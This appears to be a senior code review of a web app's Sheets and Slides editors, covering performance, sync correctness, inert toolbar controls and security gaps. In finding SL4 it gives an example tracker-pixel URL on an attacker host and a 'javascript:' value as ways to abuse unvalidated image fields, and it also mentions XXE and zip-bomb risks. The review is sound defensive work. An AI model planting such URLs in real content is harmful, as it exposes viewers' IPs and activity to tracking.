# Sheets + Slides — Senior Review

_Scope: `apps/web/src/features/sheets/`, `apps/web/src/features/slides/`, `apps/helix/src/platform/sheets/`, `apps/helix/src/platform/slides/`. Reviewer spot-checked the 9k/7k line editor files and the 5k/1.6k line stores._

## Summary (Sheets)

Sheets is the more mature of the two editors. The backend has a real operational-transform pipeline with revision tracking, op-log compaction, conflict transformation, cross-node fanout, and a hand-rolled but safe arithmetic parser (no `eval`). The bad news is that almost everything lives in two enormous files (`store.ts` 4943 LOC, `native-spreadsheet-editor.tsx` 9318 LOC, `formula.ts` 1568 LOC) and the Postgres apply path rewrites every cell on every operation — a sharp perf cliff at any meaningful sheet size. Formatting toolbar buttons (font family, font size, underline, strikethrough, vertical align, wrap, merge) are still TODOs.

## Summary (Slides)

Slides is functional for first-pass authoring but the collaboration layer is a paper tiger. There is no operational transform, no op-log compaction, no cross-node WS fanout, and concurrent edits to the same slide silently last-write-wins the entire slide content (losing co-author shape changes). The slide content schema accepts any 2000-char string for `imageUrl`/`mediaUrl` with no scheme validation — opening the door to off-domain tracker pixels and SVG/PDF SSRF. The presentation-chrome menu is mostly `noop /* TODO */` placeholders (Undo, Redo, Cut/Copy/Paste, font controls, animations panel, transitions panel, keyboard shortcuts, About, Share link, copy link). PPTX export only round-trips data: URIs — Drive-hosted images silently degrade to placeholders.

## Scorecard

| Area   | Security | Correctness | Features | Quality |
| ------ | -------- | ----------- | -------- | ------- |
| Sheets | 4/5      | 3/5         | 3/5      | 2/5     |
| Slides | 2/5      | 2/5         | 2/5      | 2/5     |

---

## Findings — Sheets

### S1: 9 318-line editor component · medium · code-quality

**File**: `apps/web/src/features/sheets/native-spreadsheet-editor.tsx:1-9318`

**What's wrong**: One file holds the editor shell, GridRow, selection state, fill, paste/copy, charts, pivots, named ranges, merged ranges, filter views, conditional formatting, protected ranges, data validation, comments rail, AI assist, the metadata round-trip, AND every helper. ~282 hooks invocations were counted; 100+ top-level functions. The test file mirrors it at 3 591 lines. Hot reload, lint, and code review effectively give up.

**Fix**: Split into `grid/` (GridRow, virtual scroll, selection), `model/` (metadata helpers — chart/pivot/named-range serialization), `inspectors/` (filter, validation, format panels), `clipboard/` (copy/paste/drag-fill), `controller/` (toolbar actions, undo, sync glue). Move the 70+ metadata round-trip helpers (`sheetChartsFromMetadata`, `sheetPivotTablesFromMetadata`, etc., lines 5196–5310) to a `metadata.ts` module — they're already pure.

**Effort**: L

### S2: Per-operation `delete from sheet_cells` + N inserts · high · perf

**File**: `apps/helix/src/platform/sheets/store.ts:4055-4089`

**What's wrong**: Every applied operation does `await tx\`delete from sheet_cells where sheet_tab_id = ${input.tabId}\`` followed by a serial `for (const cell of nextCells)` insert loop. Even a single-cell edit on a 10 000-cell tab rewrites all 10 000 rows in one transaction. For burst editing this is O(cells × ops) wire/disk traffic and dramatically inflates the WAL.

**Fix**: For `set-cell`/`clear-cell` ops compute the delta and `insert ... on conflict (sheet_tab_id, row, col) do update` only the touched coordinates. For structural ops (insert/delete row/col) drive the shift with a single `update sheet_cells set row = row +/- $count where row >= $index` query. Batch inserts using `tx\`insert ... values ${tx(rows, ...)}\``.

**Effort**: M

### S3: Sync client drops `compacted` / `dropped` / `duplicate` / `reconnectRequired` · high · correctness

**File**: `apps/web/src/features/sheets/native-spreadsheet-sync-provider.ts:160-182`, `438-443`

**What's wrong**: `handleMessage` only reacts to `ready`, `operation`, `ack`, and `error` (where it only forwards the string). The server emits `compacted` + `reconnectRequired:true` (routes.ts:249-258), `dropped:true`, and `duplicate:true`, but the client just sets `this.revision = message.revision` and moves on. Result: when the user's base revision falls behind compaction the editor will keep sending stale operations that the server keeps rejecting, with no UX signal and no reconnect.

**Fix**: Extend `isAckFrame` to carry `dropped`/`duplicate` and `isErrorFrame` to carry `reconnectRequired`/`compactedThroughRevision`. On `reconnectRequired`, tear down the socket, refetch the tab, and reconnect. On `dropped` or `duplicate`, surface a one-off toast and roll the locally-applied edit out of the optimistic grid.

**Effort**: M

### S4: Formula reference regex collides with letter-tab names · medium · correctness

**File**: `apps/helix/src/platform/sheets/formula.ts:1371-1372`, `1464`

**What's wrong**: `formulaCellReferencePattern` accepts unquoted tab names matching `[A-Z_][A-Z0-9_.-]*!...`. A user-named tab like `A1!` will be interpreted as a cross-tab reference rather than as a plain identifier, and conversely a tab named `Sum` won't be detected because of the case-insensitive regex on functions. The `splitTabScope` helper depends on whether the literal happens to be in `tabIdByName`. Subtle and silent.

**Fix**: When parsing references, prefer the longest match that resolves to a real tab; if the tab isn't found, fall through to "single-cell reference in source tab" rather than returning `null` (which the caller then treats as `0`). Add tests for tabs named `A`, `R1C1`, `Sum`, and `TRUE`.

**Effort**: S

### S5: Arithmetic parser silently truncates numbers like `1..5` or `..3` · low · correctness

**File**: `apps/helix/src/platform/sheets/formula.ts:1348-1358`

**What's wrong**: `parseNumber` consumes any run of `[0-9.]`, so `1..5` becomes `Number("1..5")` → `NaN` and percolates back as `#VALUE!`. Worse, `.` alone is consumed as a 1-char number → `Number(".")` → `NaN`. The error message is generic, so debugging a formula like `=A1+.B1` is unpleasant.

**Fix**: Use a stricter number production (`[0-9]+(\.[0-9]+)?`), and reject leading-dot/double-dot up front with a clearer error.

**Effort**: S

### S6: `evaluateSheetFormulas` recomputes from scratch on every cell change · medium · perf

**File**: `apps/helix/src/platform/sheets/formula.ts:77-160`

**What's wrong**: The evaluator builds `values`/`formulas` maps for every cell on every call, then walks the dependency graph anew. With each `applyOperation` you re-evaluate the entire tab (post-update, in `refreshFormulaMetadata`). For a sheet with thousands of formulas this is the dominant CPU cost.

**Fix**: Keep `calcValue`/`dependencies` in the cell row (already there) and recompute only the transitive closure that depends on changed cells. The reverse-dependency index can be cached alongside the tab snapshot.

**Effort**: M

### S7: Comments anchor JSON has no schema validation on the wire · medium · correctness

**File**: `apps/helix/src/platform/sheets/store.ts:139-140` (`anchor?: JsonObject`)

**What's wrong**: `createComment.anchor` is typed `JsonObject` and round-tripped to the DB without validation. The frontend's `sheetCommentContainsCell` walks an expected `{type:"sheet-range", tabId, range}` shape but a malicious or buggy caller can submit anything. There's also no enforcement that `range` is in-bounds.

**Fix**: Zod-validate the anchor union in `routes`/`tools` (sheet-cell, sheet-range, sheet-tab) before persisting. Reject ranges with negative coordinates or coordinates beyond `SHEET_MAX_ROWS`/`SHEET_MAX_COLS`.

**Effort**: S

### S8: Optimistic grid never reverts a server-rejected edit · medium · correctness

**File**: `apps/web/src/features/sheets/native-spreadsheet-sync-provider.ts:127-153`, editor reducer

**What's wrong**: `sendCellEdits` returns `true` once the WS frame is queued; the editor patches its local state immediately. If the server replies with `dropped` (S3) or an `error` (validation failure, protected range), the local grid keeps the bad value and the user sees inconsistent state across tabs and refreshes.

**Fix**: Pair each optimistic mutation with the returned `operation.id`; when the matching `ack` says `dropped`, replay the latest server snapshot for the affected cell. The state machine for pending ops is the natural place.

**Effort**: M

### S9: Toolbar font/size/underline/strikethrough/merge are inert · medium · features

**File**: `apps/web/src/features/sheets/native-spreadsheet-chrome.tsx:442,449,477,484,568,575,582`

**What's wrong**: Seven TODO comments mark live controls that look real to the user but do nothing. Font family, font size, underline, strikethrough, vertical alignment, wrap, and merge-from-toolbar are unwired (merge is wired separately from a right-click but not from the toolbar single-cell selection path).

**Fix**: Each maps to an existing cell `format` attribute. Wire each control through `applyFormatPatch`. None is large individually; tracking them together would help.

**Effort**: M (cumulative)

### S10: Charts/pivots stored as metadata blobs — no schema validation on persist · medium · correctness

**File**: `apps/helix/src/platform/sheets/store.ts:473-527` (interfaces are TS only)

**What's wrong**: `SheetChartMetadata`, `SheetPivotTableMetadata`, `SheetFilterViewMetadata`, etc. are only structural types; the metadata JSON is read back through `sheetChartsFromMetadata` (web) and `is*Spec` guards (web), but the server stores whatever shape the client sent. A buggy client (or a tampered request) can put garbage into a sheet's metadata that crashes the editor on reload.

**Fix**: Zod schemas in `apps/helix/src/platform/sheets/store.ts` (or a new `metadata-schemas.ts`), applied at `updateSheet` and in `routes.ts`.

**Effort**: M

### S11: Frontend `applySpreadsheetOperationToTab` diverges from backend apply · medium · correctness

**File**: `apps/web/src/features/sheets/native-spreadsheet-sync-provider.ts:211-299`

**What's wrong**: Both client and server contain near-identical OT/apply code paths (compare against `apps/helix/src/platform/sheets/store.ts:2169-2319`). The two implementations of `rebaseSpreadsheetFormulaForStructuralChange` differ subtly: the server checks `isScopedToExplicitSheet` to skip cross-tab references; the client does not. After a row insert, a cell with `=OtherTab!A5` on the client gets rebased even though the server leaves it alone. Conflict.

**Fix**: Extract the rebase + apply logic into a shared package (`packages/sheets-ot/` or similar) and import it from both sides. Tests exist for both — collapse them into one suite.

**Effort**: M

### S12: `seed.test.ts` still ships, but `seed.ts` is now an empty type/helper file · low · cleanup

**File**: `apps/web/src/features/sheets/seed.ts`, `apps/web/src/features/sheets/seed.test.ts`

**What's wrong**: The header explicitly says the seed arrays "have been removed". The remaining content is pure helpers (`parseCurrency`, `sumArr`, `columnLetter`, `cellReference`). Module name lies; the matching test file is mostly testing trivia.

**Fix**: Rename `seed.ts` → `grid-utils.ts`, fold tests into `model.test.ts`.

**Effort**: S

### S13: `SHEET_MAX_ROWS = 10_000` / `SHEET_MAX_COLS = 50` only enforced client-side · medium · security/correctness

**File**: `apps/web/src/features/sheets/native-spreadsheet-editor.tsx:80-81`, server `store.ts` cell edit validation

**What's wrong**: `assertCellEdit` (store.ts:343) only checks `row/col >= 0` and that value length ≤ 32 768. A scripted client can `set-cell` at row 10 000 000, blowing up server memory in `applySheetOperationToCells` (which materializes a Map keyed by every cell).

**Fix**: Add server-side upper bounds matching the client constants (and validate `insert-rows index + count <= MAX_ROWS`).

**Effort**: S

### S14: `QUERY` formula limited to 5 000 cells but no per-tab evaluation budget · low · perf/dos

**File**: `apps/helix/src/platform/sheets/formula.ts:342-349`

**What's wrong**: A single QUERY caps at 5k cells, but a tab can chain dozens of QUERYs across cells; the global evaluation budget is unbounded. Combined with S6 (full-tab re-eval per op) a 1 000-formula tab is a noticeable hotspot.

**Fix**: Add a top-level evaluation watchdog (`max formulas evaluated per call`, `max wall-clock ms`) and fail open formulas to `#TIMEOUT!`.

**Effort**: S

### S15: `formulaCellReferencePattern` is `/giu` but used by `String.prototype.replace` — lastIndex bugs · low · correctness

**File**: `apps/helix/src/platform/sheets/formula.ts:278, 1371`

**What's wrong**: A `g` regex used as a replace pattern is fine in `.replace`, but the same regex object is also used inside `evaluateExpression` re-entry paths. RegExp objects with `g` carry `lastIndex` state across `.exec` calls; if any future change uses `.exec` instead of `.replace` you have a stateful global, hard to debug.

**Fix**: Construct the regex inline in `replace` calls; export only a `string`/factory.

**Effort**: S

### S16: Aggregate sums via `args.split(",")` mishandles nested commas in named ranges · medium · correctness

**File**: `apps/helix/src/platform/sheets/formula.ts:259-277`, `aggregateArguments`

**What's wrong**: For `SUM/AVERAGE/COUNT/...` the normalized expression is the source text with the function call substituted. The inner `args.split(",")` is naive — a named range containing a comma (allowed in `SheetFormulaNamedRange.name`?) or a literal like `",1,2"` would corrupt parsing. Worse, nested function calls inside aggregates (`SUM(A1, MIN(B1:B5))`) won't parse — the outer regex `\b(SUM|...)\(([^()]*)\)` excludes parens.

**Fix**: Use `splitFunctionArguments` (already defined for conditional aggregates) consistently. Document that nested calls inside `SUM` aren't supported (and add a test asserting #VALUE! rather than silent miscount).

**Effort**: S

### S17: No real-time presence/awareness for sheets (only slides) · low · features

**File**: `apps/helix/src/platform/sheets/routes.ts`

**What's wrong**: The slides socket carries `awareness` frames (selectedSlideId/shapeId, mode). The sheets socket has no equivalent — collaborators see no cursors, no presence indicator. This was probably deliberate scope but worth flagging.

**Fix**: Add `awareness` frames with `selectedCell`/`selectedRange`/`tabId`; render colored selection rings (the editor already has a `RemoteShapeSelectionIndicator` analog on the slides side).

**Effort**: M

---

## Findings — Slides

### SL1: Concurrent edits to the same slide silently overwrite each other · critical · correctness

**File**: `apps/helix/src/platform/slides/store.ts:651-708` (Postgres `applyOperation`), `787-818` (`update-slide` branch)

**What's wrong**: There is no operational transform. `applyOperation` only checks `baseRevision > latestRevision` (ahead) and `existingRows[0] !== undefined` (duplicate). If two users edit different shapes on the same slide at the same revision, the second `update-slide` overwrites `content` wholesale with whatever the second client posted — losing the first user's shape edits entirely. No conflict signal, no merge. Compare sheets which has `transformSheetOperation` (store.ts:1987) for the same problem.

**Fix**: Either (a) move slide editing to per-shape ops (`update-shape`, `delete-shape`, `reorder-shape`) so two-user editing of different shapes is conflict-free, or (b) implement a real per-slide content merge that diffs shape arrays by `id`. Option (a) is closer to how the frontend already thinks about state and is the right long-term answer.

**Effort**: L

### SL2: No op-log compaction · high · perf/correctness

**File**: `apps/helix/src/platform/slides/store.ts:651-708`, `routes.ts:156-167`

**What's wrong**: `slides_op_log` grows forever. Every applied operation is appended; there is no equivalent of `compactSheetsOperationLog` (sheets routes.ts:444). A deck edited over months will have a slow `select coalesce(max(revision), 0)` and an enormous `listOperations` payload on reconnect.

**Fix**: Mirror the sheets compaction story — `compactSlideOperations` + a `compactedThroughRevision` value in deck metadata, and reject `baseRevision < compactedThroughRevision` with a `reconnectRequired` frame.

**Effort**: M

### SL3: No cross-node WS fanout · high · correctness

**File**: `apps/helix/src/platform/slides/routes.ts:112-216`

**What's wrong**: Sheets routes accept an `events: EventBus` and publish/subscribe to `sheets.sync.{org}.{sheet}` so multi-node deployments fan out operations. Slides routes do not. In a horizontally-scaled deployment, two users on different nodes editing the same deck won't see each other's edits at all.

**Fix**: Mirror `publishSheetsFanout` / `handleSheetsFanoutEvent` for slides, with `slides.sync.{org}.{deck}`.

**Effort**: M

### SL4: `imageUrl`/`mediaUrl`/`mediaPosterUrl`/`mediaCaptionUrl` accept any URL scheme · high · security

**File**: `apps/helix/src/platform/slides/content.ts:44-52`

**What's wrong**: All four URL fields are `z.string().max(2_000).optional()` with no `.url()` constraint and no scheme allowlist. A malicious tenant member (or anyone with edit access to a shared deck) can plant `imageUrl: "http://attacker.example/track.gif?u=victim"` (tracker pixel that leaks viewer IP & timing whenever the slide renders) or `mediaUrl: "javascript:..."` (HTML5 ignores it on `<img src>` but `<video src>` semantics are looser). The SVG export (`export-assets.ts:280`) embeds the URL into `<image href="...">` so an export opened in a browser still SSRFs.

**Fix**: Allowlist `https:` URLs starting with `/api/drive/objects/` (the in-tenant Drive proxy). Reject all other schemes (`javascript:`, `data:` for non-images, `file:`, `gopher:`, `ws:`). Apply the same validator in `parseSlideContent` and in the export-time SVG renderer.

**Effort**: S

### SL5: `presentation-chrome.tsx` is a TODO graveyard · high · features

**File**: `apps/web/src/features/slides/native-presentation-chrome.tsx:171-626` (43+ TODO markers)

**What's wrong**: Edit menu Undo/Redo/Cut/Copy/Paste, View menu Grid/Rulers/Guides/Zoom/Fit, Format menu Bold/Italic/Underline/Strikethrough/Align Left/Center/Right/Justify/Bulleted/Numbered, Transitions panel, Animations panel, Keyboard shortcuts, About, Share Link, Copy Link, and a dozen toolbar buttons are all wired to `noop /* TODO */`. The user sees a full Google-Slides-style chrome that does almost nothing.

**Fix**: Most of these have model state to wire (the Format ones especially, since the inspector tab already controls bold/italic/etc.). Either implement or hide; shipping inert buttons is worse than not shipping them. Triage into "wire to existing model" (~30 of them) and "needs new state" (~10).

**Effort**: L

### SL6: PPTX export silently degrades Drive-hosted images to placeholders · high · features

**File**: `apps/helix/src/platform/slides/export-pptx.ts:337-449`

**What's wrong**: `renderPptxImage` calls `imageDataFromDataUri`, which only matches `data:image/(png|jpeg|jpg|gif);base64,...`. Drive object URLs (`/api/drive/objects/{id}/content` — the only thing the editor actually produces) never match, so `renderPptxImage` returns `false` and `renderPptxShapePlaceholder` writes a dashed grey box with the alt text. The user uploaded an image, sees it in the editor, exports to PPTX, and discovers the image is gone.

**Fix**: Add a Drive-blob fetcher to the export pipeline. Given `/api/drive/objects/{id}/content`, fetch the bytes (with the export-job actor's permissions), inline as base64 data URI, then pass to pptxgenjs. Same fix applies to `export-assets.ts` SVG/PDF renderers (which embed external URLs that won't be available offline).

**Effort**: M

### SL7: `import-pptx.ts` uses `fast-xml-parser` without disabling DTDs/entities · medium · security

**File**: `apps/helix/src/platform/slides/import-pptx.ts:21-25`

**What's wrong**: `fast-xml-parser` by default does not resolve external entities, but the parser is instantiated with `ignoreAttributes: false` and no explicit `processEntities` opt-out. PPTX is user-supplied content from an upload endpoint. A maliciously crafted slide XML with an XXE payload is unlikely to exfiltrate (fast-xml-parser doesn't fetch network) but local-file inclusion via DOCTYPE is worth defending against explicitly. Also `JSZip.loadAsync(input.content)` has no size cap — a zip bomb (small archive, gigabytes uncompressed) can OOM the server.

**Fix**: Set `processEntities: false` on the parser. Wrap the JSZip load in a streaming reader and bail past 50 MB uncompressed (or whatever the upload limit is). Reject zips with > 500 entries.

**Effort**: S

### SL8: 7 476-line editor component · medium · code-quality

**File**: `apps/web/src/features/slides/native-presentation-editor.tsx:1-7476`

**What's wrong**: Same pattern as S1 — one file holds the editor shell, PresentationMode (~700 LOC), SlideEditor, SlidePreview, every shape renderer, all the AI/draft helpers, the speech-recognition transcript bookkeeping, the recording/zip code, the comments rail, the mention textarea, the editor controller, and ~70 helpers. The inspector tab `inspectors/inspector-tabs.tsx` *imports back into* the giant editor file for style constants (line 39-55 of inspector-tabs.tsx), creating a circular dependency between the panel and the editor.

**Fix**: Move style constants and pure helpers to `slides/styles.ts` and `slides/helpers.ts`. Split `PresentationMode`, `SlideEditor`, `SlidePreview`, and `SlideMediaShape` into their own files. The `captionTranscript*` and zip code already look like a separate `recording.ts` module.

**Effort**: L

### SL9: `update-slide` `??`-merges allow lossy "partial" updates · medium · correctness

**File**: `apps/helix/src/platform/slides/store.ts:797-808`

**What's wrong**: `nextContent = input.operation.content ?? existing.content` and `nextNotes = input.operation.speakerNotes ?? existing.speakerNotes`. Combined with the lack of OT (SL1), an update-slide that only sends `speakerNotes` will preserve the existing content — but an update-slide that sends `content` clobbers the entire content blob (including any shape edits another user just made). Even single-user, an "update notes" action collides with a concurrent "add shape" action.

**Fix**: Same fix as SL1 — move to shape-granular ops.

**Effort**: included in SL1

### SL10: Slides socket `applyOperation` reply contains the full deck snapshot on every op · medium · perf

**File**: `apps/helix/src/platform/slides/routes.ts:283-295`

**What's wrong**: After every op the server broadcasts `{deck, slides: deckDetail.slides.map(serializeSlide)}` to every peer. For a deck with 100 slides and active editing, every keypress fans out the entire deck. Wire amplification, but also CPU (every `serializeSlide` rebuilds a JsonObject).

**Fix**: Broadcast only the changed slide/deck delta. Clients can apply the op themselves (they already have the operation kind + payload).

**Effort**: M

### SL11: `awareness` accepts `selectedShapeId` up to 120 chars but renders into the DOM as a class · low · security/quality

**File**: `apps/helix/src/platform/slides/routes.ts:99`, frontend `RemoteShapeSelectionIndicator` (editor.tsx:3155)

**What's wrong**: The shape-id is user-influenced (slides allow custom shape ids). The awareness frame ferries it to peers, and the frontend may interpolate it into selectors. The shape-id has no character class constraint (`z.string().min(1).max(120)`) — newlines, attribute-breaking quotes, etc. would all pass.

**Fix**: `z.string().regex(/^[A-Za-z0-9_-]+$/u).min(1).max(120)` on both sides.

**Effort**: S

### SL12: `presentation-ai.ts` is canned-template text generation marketed as AI · low · features

**File**: `apps/web/src/features/slides/presentation-ai.ts:13-82`

**What's wrong**: `generatePresentationDeck` returns a fixed 6-slide template populated with the user's prompt run through a regex. It's not AI in any meaningful sense — same goes for `spreadsheet-ai.ts` which uses heuristics. Tests acknowledge this implicitly (no LLM mock). Either name it correctly (`heuristicDeck`, `heuristicRange`) or wire to an actual model.

**Fix**: Rename to make non-AI nature obvious, or wire to the platform's `/api/ai/*` endpoint (presumably exists elsewhere).

**Effort**: S

### SL13: PPTX import is text-only by design — confusingly named "first-pass-text" fidelity · low · features

**File**: `apps/helix/src/platform/slides/import-pptx.ts:36-39`, `83-86`

**What's wrong**: The importer's metadata says `fidelity: "first-pass-text"` and produces only `title` + `bullets` slides. Images, shapes, transitions, layouts, themes, animations — all dropped. The user uploads a real PPTX and gets a wireframe back. The metadata field documents the limitation but the UI does not.

**Fix**: Surface "First-pass text-only import; visuals were dropped" as a toast/banner after import. Long-term, parse a few more node types — pptxgenjs (which the export uses) reads enough to round-trip basic shapes.

**Effort**: S

### SL14: `seed.ts` is mis-named (also true on sheets side — see S12) · low · cleanup

**File**: `apps/web/src/features/slides/seed.ts:1-9`

**What's wrong**: Header says seed arrays were removed; file is now type definitions and `slideToContent`/`contentToSlide` conversion helpers.

**Fix**: Rename to `types.ts` or split types from helpers.

**Effort**: S

### SL15: PresentationMode caption transcripts persist to `localStorage` unbounded by deck · low · privacy/quality

**File**: `apps/web/src/features/slides/native-presentation-editor.tsx:2794-2854`

**What's wrong**: `CAPTION_TRANSCRIPT_LIBRARY_KEY = "helix.slides.captionTranscripts.v1"` is shared across all decks the user opens on a device, with only a 6-entry FIFO cap. There's no per-tenant scoping, no encryption, and no expiry. If a user logs out and another logs in, transcripts from the previous session are still in localStorage.

**Fix**: Either scope the key by `actorId`+`orgId` and clear on logout, or persist transcripts server-side (recording.ts pattern would naturally cover this).

**Effort**: S

### SL16: No undo/redo at all in slides editor (TODO comments in chrome) · medium · features

**File**: `apps/web/src/features/slides/native-presentation-chrome.tsx:171-172`

**What's wrong**: `edit:undo` / `edit:redo` menu items are `noop /* TODO */`. The editor controller (`slide-editor-controller.ts`) has no undo stack. For a non-trivial editor, this is table stakes.

**Fix**: Maintain a bounded operation history (the op log on the server is the source of truth; the client just needs to send the inverse operation). Since every action already produces a `SlideSyncOperation`, undo is "send the inverse op".

**Effort**: M

### SL17: Reordering uses two UPDATE passes with negative positions, not safe under concurrent reorder · medium · correctness

**File**: `apps/helix/src/platform/slides/store.ts:751-762`, `847-859`

**What's wrong**: `create-slide` and `reorder-slides` both do `set position = -1 - position` then `set position = (-1 - position) + 1` to slide indices out of the way. This is a clever hack to avoid the unique constraint on `(deck_id, position)`, but two concurrent reorders racing in `read committed` can end with two slides at the same negative position momentarily, and there's no `select ... for update` to serialize them. The `tx.begin` does give a transaction but the constraint is checked at row update time.

**Fix**: `lock slides in row exclusive mode where deck_id = $1` at the top of the txn, OR rebuild the entire `position` column from an ordered list in a single `update ... set position = data.idx from (values ...) data(id, idx) where slides.id = data.id`.

**Effort**: S

### SL18: `SlideShapeAnimation.order` and `presentation-chrome.tsx` animation panel are unwired · low · features

**File**: `apps/web/src/features/slides/native-presentation-chrome.tsx:372-378`, `apps/helix/src/platform/slides/content.ts:18-24`

**What's wrong**: The schema supports per-shape entrance/exit animations with order, motion path, duration, easing. The chrome menu items to open the "transitions side panel" and "animations side panel" are `noop /* TODO */`. The frontend renders animations in `PresentationMode` but the only way to set them is via the raw inspector form.

**Fix**: Either wire the panel buttons to scroll the inspector to the right section, or build proper transition/animation panels (they fit in the existing inspector tab pattern).

**Effort**: M

### SL19: Slide thumbnail rail re-renders the full slide on every keystroke · low · perf

**File**: `apps/web/src/features/slides/slide-thumbnail-rail.tsx`, called from editor

**What's wrong**: Thumbnails re-render whenever `slides` array reference changes (which is every patch). For 50+ slides, this is the dominant frame cost during typing.

**Fix**: Wrap each thumbnail in `React.memo` keyed on `(slide.id, slide.updatedAt)`. The shape data flows through stable references already; only the active slide actually changes per keystroke.

**Effort**: S

---

## Cross-cutting observations

- **Test suites are massive but mirror the size of the files they cover** — `native-spreadsheet-editor.test.tsx` is 3 591 LOC, `native-presentation-editor.test.tsx` is 3 734 LOC. Splitting the editors (S1, SL8) is what unblocks splitting the tests.
- **Server validation skew between sheets and slides** — sheets enforce title length, tab name length, cell value length; slides routes accept `z.record(z.unknown())` for metadata with no caps.
- **Shared OT/rebase logic should be a package** — three copies of "rebase formula on row insert" (server store, server formula, client sync). Pick one, share it.
- **Documentation TODOs (e.g. `TODO(helix-editors)`)** point to a missing engine for XLSX/OOXML parsing — the Sheets list page advertises XLSX uploads as openable in the native editor, but the loader doesn't actually parse OOXML. This is a UX promise the backend can't keep.

_Total findings: 36 (17 Sheets + 19 Slides)._
